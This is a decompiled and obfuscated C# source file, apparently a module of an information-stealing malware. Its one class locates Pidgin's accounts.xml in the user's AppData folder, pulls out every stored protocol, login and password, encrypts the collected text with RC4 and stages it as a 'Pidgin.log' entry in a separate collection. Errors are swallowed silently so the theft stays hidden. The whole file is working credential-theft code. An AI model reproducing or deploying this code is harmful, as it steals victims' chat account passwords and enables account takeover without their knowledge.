using System;
using System.IO;
using System.Text;
using System.Xml;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000061 RID: 97
	internal class Class_74
	{
		// Token: 0x060001C6 RID: 454 RVA: 0x0000F420 File Offset: 0x0000D620
		public static void vmethod_235(string str_0)
		{
			if (File.Exists(Class_74.field_2))
			{
				Class_74.dmethod_236(Class_74.field_2, str_0);
			}
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x0000F448 File Offset: 0x0000D648
		public static void dmethod_236(string str_0, string str_1)
		{
			try
			{
				if (File.Exists(str_0))
				{
					try
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(new XmlTextReader(str_0));
						foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
						{
							XmlNode xmlNode = (XmlNode)obj;
							string innerText = xmlNode.ChildNodes[0].InnerText;
							string innerText2 = xmlNode.ChildNodes[1].InnerText;
							string innerText3 = xmlNode.ChildNodes[2].InnerText;
							if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
							{
								break;
							}
							Class_74.field_3 = Class_74.field_3 + "Protocol: " + innerText + Environment.NewLine;
							Class_74.field_3 = Class_74.field_3 + "Login: " + innerText2 + Environment.NewLine;
							Class_74.field_3 = Class_74.field_3 + "Password: " + innerText3 + Environment.NewLine;
							Class_74.field_1++;
							Class_74.field_0++;
						}
						int length = Class_74.field_3.Length;
						Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_1 + "\\Jabber\\Pidgin\\Pidgin.log", Class_47.RC4(Encoding.UTF8.GetBytes(Class_74.field_3)));
						Class_74.field_3 = "";
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000123 RID: 291
		public static int field_0;

		// Token: 0x04000124 RID: 292
		public static int field_1;

		// Token: 0x04000125 RID: 293
		private static readonly string field_2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple\\accounts.xml");

		// Token: 0x04000126 RID: 294
		private static string field_3 = "";
	}
}
